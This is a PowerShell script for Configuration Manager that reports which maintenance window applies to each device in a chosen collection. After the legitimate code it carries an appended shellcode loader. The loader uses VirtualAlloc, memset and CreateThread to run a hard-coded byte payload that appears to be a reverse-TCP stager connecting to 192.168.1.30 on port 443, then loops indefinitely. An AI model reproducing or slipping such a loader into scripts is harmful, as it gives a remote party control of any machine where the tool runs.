
[CmdletBinding(SupportsShouldProcess)]
param(
    [parameter(Mandatory=$true, HelpMessage="Specify the Site Server computer name where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Specify the name of a Collection")]
    [ValidateNotNullOrEmpty()]
    [string]$CollectionName,
    [parameter(Mandatory=$true, HelpMessage="Specify a single collection to skip checking against or an array of collections")]
    [ValidateNotNullOrEmpty()]
    [string[]]$SkipCollectionID,
    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation")]
    [switch]$ShowProgress
)
Begin {
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        throw "Unable to determine SiteCode"
    }
}
Process {
    if ($PSBoundParameters["ShowProgress"]) {
        $CollectionSettingsCount = 0
        $ProgressCount = 0
    }
    $CollectionID = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "Name like '$($CollectionName)'" | Select-Object -ExpandProperty CollectionID
    if ($CollectionID -ne $null) {
        
        $DeviceArrayList = New-Object -TypeName System.Collections.ArrayList
        $Devices = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_RES_COLL_$($CollectionID) -ComputerName $SiteServer | Select-Object -Property Name, ResourceID
        foreach ($Device in $Devices) {
            $DeviceArrayList.Add($Device.Name) | Out-Null
        }
        Write-Verbose -Message "Device count for collection '$($CollectionName)': $($DeviceArrayList.Count)"
        
        $CollectionSettingsArrayList = New-Object -TypeName System.Collections.ArrayList
        $CollectionSettings = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CollectionSettings -ComputerName $SiteServer
        foreach ($CollSetting in $CollectionSettings) {
            $CollSetting.Get()
            if ($CollSetting.ServiceWindows.Count -ge 1) {
                $CollectionSettingsArrayList.Add($CollSetting) | Out-Null
                if ($PSBoundParameters["ShowProgress"]) {
                    $CollectionSettingsCount++
                }
            }
        }
        
        $MaintenanceWindowsArrayList = New-Object -TypeName System.Collections.ArrayList
        foreach ($CollectionSetting in $CollectionSettingsArrayList) {
            $CurrentCollectionName = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "CollectionID like '$($CollectionSetting.CollectionID)'" | Select-Object -ExpandProperty Name
            if ($PSBoundParameters["ShowProgress"]) {
                $ProgressCount++
            }
            if ($PSBoundParameters["ShowProgress"]) {
                Write-Progress -Activity "Enumerating Maintenance Windows collections" -Id 1 -Status "$($ProgressCount) / $($CollectionSettingsCount)" -CurrentOperation "Current collection: $($CurrentCollectionName)" -PercentComplete (($ProgressCount / $CollectionSettingsCount) * 100)
            }
            if ($CollectionSetting.CollectionID -notin $SkipCollectionID) {
                $CollectionSetting.Get()
                foreach ($MaintenanceWindow in $CollectionSetting.ServiceWindows) {
                    $MWCollectionMembers = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_RES_COLL_$($CollectionSetting.CollectionID) -ComputerName $SiteServer | Select-Object -Property Name, ResourceID
                    foreach ($MWCollectionMember in $MWCollectionMembers) {
                        if ($MWCollectionMember.Name -in $DeviceArrayList) {
                            if ($MWCollectionMember.Name -notin $MaintenanceWindowsArrayList) {
                                $PSObject = [PSCustomObject]@{
                                    ComputerName = $MWCollectionMember.Name
                                    MaintenanceWindow = $MaintenanceWindow.Description
                                    Collection = $CurrentCollectionName
                                }
                                Write-Output $PSObject
                                $MaintenanceWindowsArrayList.Add($MWCollectionMember.Name) | Out-Null
                            }
                        }
                    }
                }
            }
        }
    }
    else {
        Write-Warning -Message "Unable to determine CollectionID for '$($CollectionName)'"
    }
}
$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x1e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

